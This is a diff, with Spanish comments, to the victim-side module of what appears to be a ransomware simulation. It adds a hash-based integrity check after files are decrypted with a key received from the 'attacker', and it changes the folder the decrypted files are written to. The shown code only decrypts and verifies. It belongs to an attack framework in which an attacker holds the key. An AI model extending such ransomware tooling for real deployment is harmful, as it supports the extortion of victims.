@@ -39,7 +39,9 @@ def handle_attacker(conn):
 
     # Derivar la clave simétrica para el descifrado y proceder a descifrar los archivos
     symmetric_key = SHA256.new(short_term_key).digest()[:16]
-    decrypt_files(symmetric_key)  # Función que implementa la lógica de descifrado de archivos
+    decrypt_files(symmetric_key)
+    verify_file_integrity()
+
 
     # Cerrar la conexión con el atacante
     conn.close()
@@ -48,7 +50,7 @@ def decrypt_files(secret_key):
     """Descifra los archivos cifrados utilizando AES en modo CBC y elimina los archivos cifrados si es necesario."""
     
     # Asegurarse de que la carpeta 'Decrypted' exista para guardar los archivos descifrados
-    decrypted_folder = 'Decrypted'
+    decrypted_folder = 'Files_to_encrypt'
     if not os.path.exists(decrypted_folder):
         os.makedirs(decrypted_folder)
 
@@ -80,6 +82,31 @@ def decrypt_files(secret_key):
         print("La carpeta 'Files_encrypted' estaba vacía y ha sido eliminada.")
 
     print("Archivos descifrados y archivos cifrados eliminados.")
+
+def verify_file_integrity():
+    """Verifica la integridad de los archivos descifrados comparando hashes."""
+    # Cargar los hashes originales del archivo JSON
+    with open('file_hashes.json', 'r') as hash_file:
+        original_hashes = json.load(hash_file)
+
+    # Verificar los hashes de los archivos descifrados
+    for file, original_hash in original_hashes.items():
+        decrypted_file_path = f'Files_to_encrypt/{file}'
+        if os.path.exists(decrypted_file_path):
+            with open(decrypted_file_path, 'rb') as f:
+                file_data = f.read()
+                file_hash = SHA256.new(file_data).hexdigest()
+
+            if file_hash == original_hash:
+                print(f"El archivo {file} se descifró correctamente.")
+            else:
+                print(f"El archivo {file} está corrupto o fue alterado.")
+        else:
+            print(f"El archivo {file} no se encontró después del descifrado.")
+
+    # Eliminar el archivo file_hashes.json después de la verificación
+    os.remove('file_hashes.json')
+    
 
 def victim_program():
     """Función principal que escucha las conexiones del atacante y maneja las comunicaciones de descifrado."""
